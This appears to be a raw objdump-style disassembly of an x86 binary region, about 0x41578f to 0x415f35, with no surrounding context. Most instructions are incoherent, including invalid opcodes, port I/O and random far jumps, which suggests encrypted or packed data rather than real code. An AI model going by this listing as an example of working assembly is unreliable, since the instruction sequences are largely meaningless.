  41578f:	mov    esp,0x4bf99b61
  415794:	dec    ebp
  415795:	popf   
  415796:	call   0xbe7dd509
  41579b:	pushf  
  41579c:	jb     0x4157d0
  41579e:	add    BYTE PTR [ebx],al
  4157a0:	(bad)  
  4157a1:	div    edi
  4157a3:	mov    edx,DWORD PTR [ebp-0x4]
  4157a6:	jmp    0x415a8a
  4157ab:	adc    al,0xcd
  4157ad:	inc    esi
  4157ae:	rol    BYTE PTR [ecx+0x51],cl
  4157b1:	xchg   esp,eax
  4157b2:	int    0x7b
  4157b4:	rcl    DWORD PTR [esi],1
  4157b6:	test   cl,bh
  4157b8:	stos   BYTE PTR es:[edi],al
  4157b9:	jmp    0xb970:0x7f0f7f75
  4157c0:	jle    0x415832
  4157c2:	jo     0x415839
  4157c4:	sub    eax,0xb6cd316e
  4157c9:	cmp    BYTE PTR [edi],0x7e
  4157cc:	mov    BYTE PTR [ecx],al
  4157ce:	(bad)  [ecx]
  4157d0:	xor    eax,0x1f567dc0
  4157d5:	mov    ds:0x598ca6a1,al
  4157da:	test   al,0x74
  4157dc:	repz add ecx,DWORD PTR [ebp+0x4b]
  4157e0:	jmp    0x4a13:0x36a1641e
  4157e7:	in     eax,0x64
  4157e9:	xchg   ecx,eax
  4157ea:	rcr    BYTE PTR [esi-0x25],1
  4157ed:	mov    ds:0xdea05738,al
  4157f2:	mov    esi,0x6fe583c7
  4157f7:	sub    BYTE PTR [esi],ah
  4157f9:	into   
  4157fa:	cwde   
  4157fb:	pop    ecx
  4157fc:	cmp    BYTE PTR [ecx+0x2c2ad224],bh
  415802:	imul   bp,WORD PTR [edx+ebp*8-0xaed3b9a],0x6c11
  41580c:	neg    BYTE PTR [eax+0x2a]
  41580f:	sbb    DWORD PTR [edi-0x750a86f2],ebx
  415815:	pop    ds
  415816:	enter  0x61b6,0xf8
  41581a:	xchg   edi,eax
  41581b:	psrad  mm2,QWORD PTR [edi]
  41581e:	push   cs
  41581f:	data16 data16 outs dx,BYTE PTR ds:[esi]
  415822:	sti    
  415823:	mov    al,ds:0x9eec714b
  415828:	push   0xd86c97bb
  41582d:	out    dx,eax
  41582e:	fist   DWORD PTR [edx+0x3c588c63]
  415834:	sbb    ebp,DWORD PTR ds:0xb780255c
  41583a:	sbb    eax,ebp
  41583c:	lea    esi,[esi+0x1e]
  41583f:	jecxz  0x41581f
  415841:	aam    0x25
  415843:	inc    ebx
  415844:	out    dx,al
  415845:	and    eax,0x6c1cfd01
  41584a:	xor    dh,ah
  41584c:	pop    es
  41584d:	jle    0x4157f0
  41584f:	pop    esp
  415850:	ins    DWORD PTR es:[edi],dx
  415851:	mov    fs,WORD PTR [ebp-0x1b]
  415854:	shl    DWORD PTR [esi+0x5cf06479],1
  41585a:	(bad)  
  41585b:	into   
  41585c:	sar    BYTE PTR [edi],cl
  41585e:	int    0xd3
  415860:	hlt    
  415861:	das    
  415862:	repz in eax,dx
  415864:	sbb    edi,DWORD PTR [ebx-0x15]
  415867:	and    ch,BYTE PTR [ebp-0x66f0bc68]
  41586d:	cs push ss
  41586f:	push   ecx
  415870:	icebp  
  415871:	hlt    
  415872:	mov    edx,0xdc193fca
  415877:	outs   dx,DWORD PTR ds:[esi]
  415878:	mov    edi,0xa5b4b5fc
  41587d:	aam    0xd6
  41587f:	ret    0x69b1
  415882:	lods   eax,DWORD PTR ds:[esi]
  415883:	push   ss
  415884:	xor    eax,0x541fd414
  415889:	mov    DWORD PTR [edx+edx*2],ebp
  41588c:	pop    ss
  41588d:	jle    0x41583c
  41588f:	and    BYTE PTR [ebx],dl
  415891:	out    dx,al
  415892:	es cld 
  415894:	mov    ds,WORD PTR [esi]
  415896:	(bad)  
  415897:	jl     0x415868
  415899:	inc    edx
  41589a:	add    BYTE PTR [ebx+0x9bdade9],bl
  4158a0:	sahf   
  4158a1:	push   ss
  4158a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158a4:	add    edx,DWORD PTR [esi]
  4158a6:	ja     0x415885
  4158a8:	cmp    bl,dh
  4158aa:	loope  0x415886
  4158ac:	pop    esp
  4158ad:	ret    
  4158ae:	lds    edi,FWORD PTR [eax]
  4158b0:	jne    0x41585f
  4158b2:	iret   
  4158b3:	cmp    esp,DWORD PTR [ebp+ecx*1-0x5c]
  4158b7:	test   al,0x12
  4158b9:	out    0x92,eax
  4158bb:	push   ecx
  4158bc:	push   0xdd3dc13a
  4158c1:	mov    ds:0x122c81a0,al
  4158c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158c7:	cmp    esp,DWORD PTR [edx+0x19f20389]
  4158cd:	call   0xa2635856
  4158d2:	cmp    BYTE PTR [edi],0x2
  4158d5:	aam    0xf5
  4158d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158d8:	xchg   edi,eax
  4158d9:	sbb    eax,0x1ae93e76
  4158de:	ss nop
  4158e0:	retf   
  4158e1:	ja     0x41587a
  4158e3:	neg    bh
  4158e5:	sbb    DWORD PTR [ecx],ebp
  4158e7:	pushf  
  4158e8:	pop    ebp
  4158e9:	jbe    0x4158d1
  4158eb:	out    0xee,al
  4158ed:	shl    DWORD PTR [ebp+0x5c],0xd7
  4158f1:	not    DWORD PTR [edi]
  4158f3:	push   ebp
  4158f4:	pop    ss
  4158f5:	iret   
  4158f6:	mov    DWORD PTR [ecx-0x382b46f9],ecx
  4158fc:	clc    
  4158fd:	ja     0x415917
  4158ff:	add    ecx,ebx
  415901:	int    0x8e
  415903:	pop    ds
  415904:	in     eax,0xfd
  415906:	push   es
  415907:	push   ebp
  415908:	adc    edx,0x747aa27d
  41590e:	jns    0x41595b
  415910:	test   BYTE PTR [ebx+edx*1],ch
  415913:	sub    al,0x26
  415915:	push   es
  415916:	popf   
  415917:	aas    
  415918:	das    
  415919:	sahf   
  41591a:	retf   0xafde
  41591d:	mov    bl,0xf2
  41591f:	mov    WORD PTR [eax],ds
  415921:	sbb    ah,BYTE PTR [edi]
  415923:	inc    ebp
  415924:	xor    esi,edx
  415926:	shl    DWORD PTR [ecx+0x1299502f],1
  41592c:	aad    0xbb
  41592e:	(bad)  
  41592f:	cli    
  415930:	mov    ebp,es
  415932:	out    dx,al
  415933:	in     al,dx
  415934:	xor    al,0x56
  415936:	mov    cl,0xd7
  415938:	xor    dl,dh
  41593a:	sub    eax,0x77ecb2ee
  41593f:	inc    ebp
  415940:	push   ecx
  415941:	stos   DWORD PTR es:[edi],eax
  415942:	out    dx,eax
  415943:	test   al,0x2b
  415945:	jb     0x415947
  415947:	add    ah,BYTE PTR [ebx+edx*1]
  41594a:	push   0x64f2e816
  41594f:	push   esp
  415950:	cmp    eax,0xb5311a96
  415955:	push   edi
  415956:	enter  0x820b,0x17
  41595a:	sbb    BYTE PTR [ebx],al
  41595c:	jecxz  0x41593a
  41595e:	pop    es
  41595f:	test   eax,0xe94afce1
  415964:	stos   DWORD PTR es:[edi],eax
  415965:	aad    0x69
  415967:	stc    
  415968:	sahf   
  415969:	cmp    al,0xee
  41596b:	or     al,0x80
  41596d:	int    0x89
  41596f:	mov    esp,DWORD PTR [esi-0x3b7d3677]
  415975:	dec    esi
  415976:	mov    ebp,0xac8604f0
  41597b:	mov    fs,WORD PTR [ebx-0x7c788472]
  415981:	scas   al,BYTE PTR es:[edi]
  415982:	jne    0x415950
  415984:	jae    0x415935
  415986:	mov    BYTE PTR [ecx+0x25],ch
  415989:	and    BYTE PTR [esi-0x6d5c7d68],dh
  41598f:	test   eax,0xeebf119b
  415995:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415996:	mov    ds:0x39382930,al
  41599b:	in     eax,dx
  41599c:	cs xor eax,0x38708d2c
  4159a2:	fidiv  WORD PTR [edx]
  4159a4:	pusha  
  4159a5:	stos   BYTE PTR es:[edi],al
  4159a6:	mul    DWORD PTR [eax-0x34]
  4159a9:	inc    esp
  4159aa:	and    eax,0xe847d43a
  4159af:	std    
  4159b0:	jecxz  0x4159b7
  4159b2:	mov    ds:0xed7940fb,eax
  4159b7:	pop    ecx
  4159b8:	dec    edx
  4159b9:	out    0x88,al
  4159bb:	pop    ebx
  4159bc:	retf   0xc1b6
  4159bf:	imul   dl
  4159c1:	cs push eax
  4159c3:	je     0x4159e0
  4159c5:	jecxz  0x4159cb
  4159c7:	shr    DWORD PTR [ecx-0x27],1
  4159ca:	cwde   
  4159cb:	or     al,0x3c
  4159cd:	and    al,0x9c
  4159cf:	xor    al,0x29
  4159d1:	jp     0x4159be
  4159d3:	sub    cl,0x58
  4159d6:	mov    bh,0xf6
  4159d8:	mov    esi,0xbd983cd8
  4159dd:	rcr    DWORD PTR [ecx+0x69],0xd0
  4159e1:	push   ebp
  4159e2:	push   ds
  4159e3:	in     eax,0x17
  4159e5:	add    al,0xb
  4159e7:	pop    edi
  4159e8:	loope  0x4159a1
  4159ea:	jle    0x415a0b
  4159ec:	and    edi,DWORD PTR ds:0xfc049f2f
  4159f2:	repz aaa 
  4159f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159f5:	pop    ebx
  4159f6:	dec    esp
  4159f7:	int3   
  4159f8:	sub    al,0x30
  4159fa:	inc    eax
  4159fb:	push   edi
  4159fc:	mov    esp,DWORD PTR [esi+0x61]
  4159ff:	cwde   
  415a00:	cli    
  415a01:	dec    esp
  415a02:	test   al,0x5e
  415a04:	xor    ebx,ebp
  415a06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a07:	adc    BYTE PTR [ecx+0x31],ch
  415a0a:	mov    esi,0x75c1c0ea
  415a0f:	mov    bh,0x22
  415a11:	cmp    dh,BYTE PTR ds:0x180d446
  415a17:	nop
  415a18:	mov    ebx,0x4e93001b
  415a1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a1e:	and    eax,0xb85e7109
  415a23:	call   0x3ec0:0x6fd1dc4a
  415a2a:	mov    dh,0x93
  415a2c:	hlt    
  415a2d:	add    BYTE PTR [ebp+0x2eea024e],0x29
  415a34:	repnz dec ebx
  415a36:	adc    BYTE PTR [eax-0x110a3585],dl
  415a3c:	xchg   ecx,eax
  415a3d:	fwait
  415a3e:	daa    
  415a3f:	pusha  
  415a40:	jle    0x415a00
  415a42:	jp     0x415a28
  415a44:	adc    bl,BYTE PTR [ecx+0x4d]
  415a47:	xchg   ebx,eax
  415a48:	out    0xd9,al
  415a4a:	sar    BYTE PTR [ebx],0x79
  415a4d:	jae    0x415a80
  415a4f:	inc    esp
  415a50:	xchg   edx,eax
  415a51:	and    eax,0x168f905f
  415a56:	idiv   BYTE PTR [edx]
  415a58:	jge    0x415ad5
  415a5a:	ficomp WORD PTR [edi+0x10]
  415a5d:	xor    al,0x2b
  415a5f:	mov    dh,0x8e
  415a61:	jge    0x415a37
  415a63:	popw   ds
  415a65:	jo     0x415a82
  415a67:	xor    dl,BYTE PTR [edi-0x41d76129]
  415a6d:	mov    edx,0xe56ee92c
  415a72:	ins    BYTE PTR es:[edi],dx
  415a73:	cmc    
  415a74:	pop    esp
  415a75:	test   DWORD PTR [esi+eiz*4],0xe3378445
  415a7c:	nop
  415a7d:	xchg   ebp,eax
  415a7e:	adc    BYTE PTR [eax-0x46704e43],bh
  415a84:	aam    0x2f
  415a86:	outs   dx,DWORD PTR ds:[esi]
  415a87:	sbb    DWORD PTR [edi-0x722ecc0d],ecx
  415a8d:	test   BYTE PTR [edx],al
  415a8f:	pushf  
  415a90:	jb     0x415ac4
  415a92:	add    cl,ch
  415a94:	fild   WORD PTR [edx]
  415a96:	add    BYTE PTR [eax],al
  415a98:	sub    dl,BYTE PTR [eax-0x24]
  415a9b:	mov    esp,0x6eaabc6a
  415aa0:	popa   
  415aa1:	pop    ecx
  415aa2:	xchg   ebp,eax
  415aa3:	aas    
  415aa4:	xor    ah,bh
  415aa6:	(bad)  
  415aa8:	mov    eax,0xb9707f0d
  415aad:	jle    0x415b1f
  415aaf:	jo     0x415ac3
  415ab1:	cmc    
  415ab2:	sub    eax,0x8a8b31fe
  415ab7:	pop    es
  415ab8:	mov    DWORD PTR [ebx-0x5b],0xf8a91613
  415abf:	sahf   
  415ac0:	popf   
  415ac1:	jmp    0xc972:0x917a9606
  415ac8:	out    dx,eax
  415ac9:	popa   
  415aca:	mov    ebx,0xb3701749
  415acf:	cmp    eax,ecx
  415ad1:	scas   al,BYTE PTR es:[edi]
  415ad2:	imul   esi,DWORD PTR [eax+0x19e207a9],0x68
  415ad9:	data16 loop 0x415aa1
  415adc:	cwde   
  415add:	mov    esp,DWORD PTR [edx]
  415adf:	jle    0x415b5f
  415ae1:	sub    eax,0x6e4af822
  415ae6:	ret    
  415ae7:	pop    eax
  415ae8:	fs adc al,bl
  415aeb:	pslld  mm2,mm6
  415aee:	push   0x5637fb5
  415af3:	ror    DWORD PTR [ebp-0x7ddd5994],cl
  415af9:	arpl   WORD PTR [ebx+ecx*8-0x5b],di
  415afd:	pop    esp
  415afe:	std    
  415aff:	dec    ecx
  415b00:	sahf   
  415b01:	lock dec esi
  415b03:	test   DWORD PTR [edx],esp
  415b05:	dec    ecx
  415b06:	dec    ebp
  415b07:	mov    bl,BYTE PTR [esp+edx*2]
  415b0a:	pop    eax
  415b0b:	icebp  
  415b0c:	jmp    0x415ad4
  415b0e:	xchg   edx,eax
  415b0f:	dec    ecx
  415b10:	xor    BYTE PTR [eax],ah
  415b12:	enter  0xd554,0x5b
  415b16:	xchg   esp,eax
  415b17:	(bad)  
  415b19:	dec    ebx
  415b1a:	push   ebp
  415b1b:	push   ss
  415b1c:	fs push ds
  415b1e:	or     al,BYTE PTR [eax+0x32]
  415b21:	mov    al,ds:0x76dbe766
  415b26:	sahf   
  415b27:	fdiv   QWORD PTR [ecx-0x2c]
  415b2a:	jle    0x415ad0
  415b2c:	shr    BYTE PTR [edx-0x5c],1
  415b2f:	fisttp QWORD PTR ds:0xfed0dd50
  415b35:	les    ecx,FWORD PTR [edx-0x78]
  415b38:	fstp   TBYTE PTR [edi]
  415b3a:	dec    ebp
  415b3b:	(bad)  
  415b3c:	fidiv  WORD PTR [ecx+0x1ed140d5]
  415b42:	jno    0x415b64
  415b44:	sub    DWORD PTR [eax],eax
  415b46:	xor    DWORD PTR ds:0xf82027f7,ebx
  415b4c:	les    ebx,FWORD PTR [ebx-0x7c597ccf]
  415b52:	pop    ebx
  415b53:	sahf   
  415b54:	aaa    
  415b55:	popa   
  415b56:	imul   ebp,esp,0xffffffa3
  415b59:	cld    
  415b5a:	dec    esi
  415b5b:	out    0x1,al
  415b5d:	dec    eax
  415b5e:	hlt    
  415b5f:	xor    DWORD PTR [edx-0x2d],edi
  415b62:	mov    edi,0x1882480e
  415b67:	(bad)  
  415b69:	inc    ecx
  415b6a:	jmp    0x415bd2
  415b6c:	shl    DWORD PTR [esp+esi*1],1
  415b6f:	(bad)  
  415b70:	adc    al,bl
  415b72:	ret    0xdebe
  415b75:	sbb    bh,bl
  415b77:	outs   dx,DWORD PTR ds:[esi]
  415b78:	xor    al,0x33
  415b7a:	adc    cl,BYTE PTR [ecx+ecx*4+0x51b5f4a5]
  415b81:	cmc    
  415b82:	push   ebx
  415b83:	mov    bh,0x2b
  415b85:	or     ch,BYTE PTR [eax]
  415b87:	jb     0x415b15
  415b89:	add    eax,0xc7e76401
  415b8e:	es and al,0xdf
  415b91:	mov    ebx,0xa0860304
  415b96:	sub    DWORD PTR [edi-0x21],ebx
  415b99:	adc    esp,edi
  415b9b:	jbe    0x415b76
  415b9d:	adc    esp,edi
  415b9f:	mov    ds:0xd4fbeb8d,al
  415ba4:	mov    eax,0xa74a4706
  415ba9:	in     al,0xc4
  415bab:	loopne 0x415b98
  415bad:	clc    
  415bae:	jns    0x415b64
  415bb0:	mov    al,BYTE PTR [ebx-0x10]
  415bb3:	mov    dl,0x67
  415bb5:	pop    ds
  415bb6:	xor    al,0x64
  415bb8:	out    0x18,al
  415bba:	sub    BYTE PTR [edi],0xf9
  415bbd:	mov    eax,ds:0x3abd6c43
  415bc2:	loope  0x415bcb
  415bc4:	sbb    BYTE PTR [ecx-0x1eedf3a8],dh
  415bca:	or     BYTE PTR [ecx],ch
  415bcc:	out    0x49,eax
  415bce:	sub    DWORD PTR [edi+0x76],ebx
  415bd1:	test   BYTE PTR [eax],al
  415bd3:	dec    eax
  415bd4:	mov    eax,0xc05d30d5
  415bd9:	jle    0x415b93
  415bdb:	js     0x415bff
  415bdd:	and    eax,DWORD PTR [eax]
  415bdf:	and    BYTE PTR [edi+0x6e],bl
  415be2:	test   al,0x83
  415be4:	fmul   QWORD PTR [esi-0x37a0f251]
  415bea:	rcr    DWORD PTR [edx+0x4a7f6a2e],cl
  415bf0:	sbb    cl,ah
  415bf2:	adc    ebx,esi
  415bf4:	jg     0x415bb9
  415bf6:	inc    ebx
  415bf7:	fdiv   DWORD PTR gs:[edi]
  415bfa:	lods   eax,DWORD PTR ds:[esi]
  415bfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bfc:	cmp    eax,0xac2d9b4b
  415c01:	xchg   ebp,eax
  415c02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c03:	ret    0xaf98
  415c06:	jp     0x415c84
  415c08:	ja     0x415c3d
  415c0a:	sbb    BYTE PTR [edi-0x382134ce],0xb1
  415c11:	inc    esp
  415c12:	mov    ebx,0x1b464cd9
  415c17:	xlat   BYTE PTR ds:[ebx]
  415c18:	les    esi,FWORD PTR [esp+edx*1-0x2740c2ca]
  415c1f:	stos   DWORD PTR es:[edi],eax
  415c20:	and    dh,BYTE PTR [edx-0x16d83eaa]
  415c26:	mov    bh,0x5b
  415c28:	xlat   BYTE PTR ds:[ebx]
  415c29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c2a:	cmp    eax,edi
  415c2c:	or     DWORD PTR [esi+0x542fa2ac],0xc01d9819
  415c36:	and    dl,BYTE PTR [edi-0x4d]
  415c39:	mov    bl,0xb5
  415c3b:	je     0x415c02
  415c3d:	test   al,0xd0
  415c3f:	lods   al,BYTE PTR ds:[esi]
  415c40:	jmp    0x3c42:0x6cdea27f
  415c47:	pop    ss
  415c48:	lahf   
  415c49:	cmp    BYTE PTR gs:[edx+0x18],0x99
  415c4e:	or     edx,DWORD PTR [esi-0x74]
  415c51:	(bad)  
  415c52:	fwait
  415c53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c54:	test   BYTE PTR [edx],cl
  415c56:	sub    al,0x27
  415c58:	jl     0x415be0
  415c5a:	neg    BYTE PTR [ecx+0x525c54f7]
  415c60:	mov    cl,0x75
  415c62:	push   ecx
  415c63:	(bad)  
  415c65:	adc    al,0x3e
  415c67:	loop   0x415c7b
  415c69:	scas   eax,DWORD PTR es:[edi]
  415c6a:	xor    edi,edi
  415c6c:	daa    
  415c6d:	out    0x64,eax
  415c6f:	in     eax,0x85
  415c71:	adc    DWORD PTR [esi+0x9],edi
  415c74:	push   esp
  415c75:	into   
  415c76:	shl    DWORD PTR [ecx-0x43],cl
  415c79:	retf   0x555a
  415c7c:	test   BYTE PTR [ebx],cl
  415c7e:	xlat   BYTE PTR ds:[ebx]
  415c7f:	aas    
  415c80:	sbb    ch,BYTE PTR [edi+0x4bb6dfd4]
  415c86:	xlat   BYTE PTR ds:[ebx]
  415c87:	loope  0x415c27
  415c89:	scas   eax,DWORD PTR es:[edi]
  415c8a:	xchg   DWORD PTR [ebx+0x61],ebp
  415c8d:	fdiv   DWORD PTR [edi-0x4bb0928a]
  415c93:	jmp    0xe1ed:0x79956e9c
  415c9a:	jmp    0x7ad2:0xe6039816
  415ca1:	cld    
  415ca2:	cmp    al,0x3a
  415ca4:	and    BYTE PTR [edi+0x25],al
  415ca7:	add    DWORD PTR [ecx+ebx*2+0x41f48d00],ecx
  415cae:	cmp    dh,dl
  415cb0:	xchg   edx,eax
  415cb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cb2:	ja     0x415ce3
  415cb4:	jl     0x415c5e
  415cb6:	add    dl,ah
  415cb8:	cmp    al,0x40
  415cba:	jno    0x415cdc
  415cbc:	and    BYTE PTR [edi+0x5236946d],al
  415cc2:	cmc    
  415cc3:	adc    DWORD PTR [esp+eiz*2],ebp
  415cc6:	repz mov eax,ds:0xfc0b3b59
  415ccc:	addr16 or eax,0x22c514a0
  415cd2:	stos   BYTE PTR es:[edi],al
  415cd3:	and    al,0xb7
  415cd5:	push   ds
  415cd6:	stc    
  415cd7:	imul   ecx,DWORD PTR [ecx+0x6c4f1e5a],0x5c
  415cde:	mov    bl,0x7a
  415ce0:	or     DWORD PTR [eax+0x2],ebx
  415ce3:	mov    ds,WORD PTR [ecx+ecx*4-0x293210bd]
  415cea:	cmc    
  415ceb:	or     al,BYTE PTR [esp+ebp*2]
  415cee:	and    eax,0x9aa43200
  415cf3:	enter  0x582a,0xa6
  415cf7:	sub    BYTE PTR [esi-0x7c],bl
  415cfa:	cmc    
  415cfb:	mov    edi,ss
  415cfd:	dec    edi
  415cfe:	(bad)  
  415cff:	dec    esi
  415d00:	aad    0xf6
  415d02:	pusha  
  415d03:	inc    eax
  415d04:	and    esi,DWORD PTR [esi]
  415d06:	lods   al,BYTE PTR ds:[esi]
  415d07:	jl     0x415ce9
  415d09:	lock or ecx,ebp
  415d0c:	push   ebp
  415d0d:	mov    WORD PTR [ebx-0x3f67643f],es
  415d13:	stos   DWORD PTR es:[edi],eax
  415d14:	and    DWORD PTR [ebx],ecx
  415d16:	ret    0xcf39
  415d19:	arpl   WORD PTR [eax-0x65],sp
  415d1c:	inc    ebp
  415d1d:	lahf   
  415d1e:	cs out dx,al
  415d20:	inc    esp
  415d21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d22:	(bad)  
  415d23:	std    
  415d24:	stc    
  415d25:	popf   
  415d26:	hlt    
  415d27:	in     eax,0x44
  415d29:	sub    DWORD PTR [ecx],0xffffffc1
  415d2c:	fsubr  DWORD PTR ds:[ecx+ebx*2]
  415d30:	sbb    cl,BYTE PTR [ecx+0x38]
  415d33:	dec    esp
  415d34:	scas   eax,DWORD PTR es:[edi]
  415d35:	mov    ecx,0xe4e8048d
  415d3a:	inc    edx
  415d3b:	out    0x70,eax
  415d3d:	push   eax
  415d3e:	push   edx
  415d3f:	les    ebp,FWORD PTR [eax-0x6cae64f]
  415d45:	test   DWORD PTR [eax-0x82611cb],0x413401b2
  415d4f:	js     0x415cfd
  415d51:	mov    bh,cl
  415d53:	movsx  edi,BYTE PTR [edi+esi*1+0x552885eb]
  415d5b:	inc    ecx
  415d5c:	in     al,0x6a
  415d5e:	jae    0x415d2a
  415d60:	pop    edx
  415d61:	scas   al,BYTE PTR es:[edi]
  415d62:	aaa    
  415d63:	retf   
  415d64:	cmc    
  415d65:	jmp    0xea39247
  415d6a:	mov    eax,0x4983bc2
  415d6f:	cmp    BYTE PTR es:[edx-0x59],ch
  415d73:	sub    BYTE PTR [ecx-0x42],bl
  415d76:	inc    esi
  415d77:	mov    edx,DWORD PTR [ebp+0x8]
  415d7a:	mov    edi,DWORD PTR [ebp-0x24]
  415d7d:	mov    DWORD PTR [edi+edx*4],eax
  415d80:	mov    eax,DWORD PTR [ebp-0x18]
  415d83:	jmp    0x416067
  415d88:	dec    eax
  415d89:	fistp  QWORD PTR [edx+0x75a9712b]
  415d8f:	arpl   bx,ax
  415d91:	pop    ss
  415d92:	jp     0x415d95
  415d94:	in     eax,0x51
  415d96:	shr    dh,0x81
  415d99:	or     bh,BYTE PTR [edi+0x70]
  415d9c:	mov    ecx,0xe270707e
  415da1:	loopne 0x415d73
  415da3:	jne    0x415d2d
  415da5:	push   edi
  415da6:	test   ebx,esp
  415da8:	sub    DWORD PTR [esi+0x78],esp
  415dab:	cmp    eax,0xe6ae0c17
  415db0:	mov    dl,0x94
  415db2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415db3:	fild   QWORD PTR [eax+eax*1+0x6ae85b40]
  415dba:	cmp    al,0x47
  415dbc:	cmc    
  415dbd:	in     eax,dx
  415dbe:	ja     0x415e30
  415dc0:	outs   dx,BYTE PTR ds:[esi]
  415dc1:	iret   
  415dc2:	dec    eax
  415dc3:	jne    0x415d4b
  415dc5:	pop    ebp
  415dc6:	sub    al,0xb0
  415dc8:	pop    ecx
  415dc9:	xlat   BYTE PTR ds:[ebx]
  415dca:	lock or dl,BYTE PTR [edi+0x8]
  415dce:	xor    eax,0xe8671f56
  415dd3:	add    bl,BYTE PTR ds:0x39c46287
  415dd9:	pop    edx
  415dda:	inc    edi
  415ddb:	jnp    0x415e37
  415ddd:	shl    BYTE PTR [ebx-0x4ab0f804],cl
  415de3:	loopne 0x415d8a
  415de5:	jecxz  0x415d75
  415de7:	fwait
  415de8:	mov    eax,0xb0191ae3
  415ded:	sbb    dl,BYTE PTR [ecx+ebx*8+0x6b2f891a]
  415df4:	mov    cl,0xa5
  415df6:	(bad)  
  415df7:	mov    ds:0x6cadf013,eax
  415dfc:	dec    ebp
  415dfd:	mov    al,ds:0x8041d8c6
  415e02:	jb     0x415e50
  415e04:	mov    ch,0x99
  415e06:	int    0x2e
  415e08:	pop    ebx
  415e09:	shl    DWORD PTR [ebp-0x31],1
  415e0c:	and    bl,BYTE PTR [ebp+0x604102d]
  415e12:	mov    DWORD PTR [ecx-0x6],esi
  415e15:	push   es
  415e16:	cmp    ch,BYTE PTR [eax-0x3880be27]
  415e1c:	pop    ecx
  415e1d:	mov    esp,edx
  415e1f:	sub    ebp,eax
  415e21:	fld    TBYTE PTR [ebx-0x72]
  415e24:	bound  esp,QWORD PTR [esi]
  415e26:	cmp    ebx,esp
  415e28:	xchg   edi,eax
  415e29:	mov    dl,0x1e
  415e2b:	rcr    DWORD PTR [ebp+0x2f0ea185],0x4b
  415e32:	dec    ebx
  415e33:	popa   
  415e34:	and    al,0x95
  415e36:	mov    bh,0x93
  415e38:	sbb    esi,DWORD PTR [esp+edi*1+0x59]
  415e3c:	fbld   TBYTE PTR [eax]
  415e3e:	sub    al,0x87
  415e40:	repz call 0xf6343e33
  415e46:	shl    BYTE PTR ds:0xe62d48dd,0x26
  415e4d:	push   ebx
  415e4e:	xchg   ecx,eax
  415e4f:	cmp    ah,cl
  415e51:	or     DWORD PTR [ebx-0x52a36128],edi
  415e57:	mov    ds:0x2c165557,eax
  415e5c:	jne    0x415dfa
  415e5e:	push   esi
  415e5f:	sbb    cl,al
  415e61:	and    ebp,DWORD PTR [ecx-0x2ae915c]
  415e67:	adc    ebp,DWORD PTR [ecx+eax*8-0x6330d349]
  415e6e:	cmc    
  415e6f:	cs sub esp,esp
  415e72:	test   DWORD PTR [esi-0x41abe25],ecx
  415e78:	ins    BYTE PTR es:[edi],dx
  415e79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e7a:	hlt    
  415e7b:	es gs jb 0x415e55
  415e7f:	jb     0x415e6e
  415e81:	loop   0x415e49
  415e83:	out    dx,eax
  415e84:	(bad)  
  415e85:	loop   0x415e20
  415e87:	mov    ebp,0x3e8b2bbf
  415e8d:	lock xchg edx,eax
  415e8f:	cwde   
  415e90:	push   0x63aca658
  415e95:	in     al,dx
  415e96:	ror    BYTE PTR [ecx-0xf],cl
  415e99:	push   0x137a40c8
  415e9e:	add    eax,DWORD PTR [eax+0x54fce59c]
  415ea4:	es cwde 
  415ea6:	and    eax,0x21c15d7
  415eab:	call   0x824d:0xfa954f8b
  415eb2:	mov    cl,0x52
  415eb4:	push   esi
  415eb5:	push   ss
  415eb6:	pop    ebp
  415eb7:	and    dh,BYTE PTR [edi-0x7500a258]
  415ebd:	mov    ebx,0xbe613801
  415ec2:	idiv   BYTE PTR [ebx]
  415ec4:	sbb    dl,cl
  415ec6:	xor    edi,eax
  415ec8:	into   
  415ec9:	or     edx,DWORD PTR [ecx]
  415ecb:	adc    al,0x7a
  415ecd:	stc    
  415ece:	adc    dh,BYTE PTR [ebx+0x563c34a9]
  415ed4:	js     0x415f4c
  415ed6:	fptan  
  415ed8:	outs   dx,DWORD PTR ds:[esi]
  415ed9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415eda:	dec    edi
  415edb:	mov    bh,0x88
  415edd:	inc    edx
  415ede:	push   esp
  415edf:	cmp    ebx,DWORD PTR [edi-0x5b]
  415ee2:	mov    ?,WORD PTR [edi]
  415ee4:	jp     0x415edd
  415ee6:	mov    esi,0xb03b10fa
  415eeb:	mov    ebp,0x59368257
  415ef0:	pop    ebx
  415ef1:	push   ebx
  415ef2:	mov    edx,0x3ffb99c6
  415ef7:	or     dl,BYTE PTR [ebx-0x65]
  415efa:	outs   dx,DWORD PTR ds:[esi]
  415efb:	(bad)  
  415efc:	dec    DWORD PTR [esi-0xc]
  415eff:	sbb    DWORD PTR [eax],esp
  415f01:	test   edx,esp
  415f03:	lods   al,BYTE PTR ds:[esi]
  415f04:	or     DWORD PTR [edx+0x266f2933],ebx
  415f0a:	add    eax,DWORD PTR [ecx+0x18]
  415f0d:	jae    0x415f73
  415f0f:	call   0xbb84:0xe5dd5a0f
  415f16:	dec    edi
  415f17:	enter  0x441f,0x12
  415f1b:	stos   BYTE PTR es:[edi],al
  415f1c:	ret    0xb912
  415f1f:	sbb    ecx,DWORD PTR [ebx+0x65264cc2]
  415f25:	cmc    
  415f26:	dec    esp
  415f27:	xor    esp,DWORD PTR [edi+eax*1-0x13]
  415f2b:	cwde   
  415f2c:	in     eax,0xca
  415f2e:	sbb    dh,al
  415f30:	inc    ecx
  415f31:	fwait
  415f32:	icebp  
  415f33:	or     dh,ah
  415f35:	xlat   BYTE PTR ds:[ebx]
